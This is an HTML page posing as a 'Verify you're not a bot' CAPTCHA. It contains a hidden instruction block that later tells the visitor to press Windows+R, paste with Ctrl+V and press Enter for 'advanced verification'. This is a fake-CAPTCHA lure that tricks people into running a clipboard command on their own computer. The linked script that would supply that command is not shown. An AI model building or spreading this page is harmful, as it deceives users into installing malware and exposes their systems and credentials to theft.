<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bot Verification</title>
    <link rel="stylesheet" href="styles.css">
    <script src="script.js" defer></script>

    <!-- FontAwesome for Windows Key Icon -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.1/css/all.min.css" rel="stylesheet">

    <style>
        /* Make the Windows key icon black */
        .windows-icon {
            color: black;  /* Change color to black */
        }
    </style>
</head>
<body>
    <div class="captcha-container">
        <div class="captcha-header">
            <h2>Verify you're not a bot</h2>
        </div>
        <div class="captcha-content">
            <div class="captcha-box">
                <input type="text" id="captchaInput" placeholder="Enter the characters you see" />
                <div id="captchaImage" class="captcha-image"></div>
            </div>
            <div class="captcha-actions">
                <button id="verifyButton">Verify</button>
            </div>
        </div>
        <div id="resultMessage" class="result-message"></div>
        <div class="command-instructions" style="display: none;">
            <p>Advanced verification required. Please press <b><i class="fas fa-windows windows-icon"></i> + R</b>, then <b>Ctrl + V</b>, and hit <b>Enter</b> to initiate the advanced verification process.</p>
        </div>
    </div>
</body>
</html>
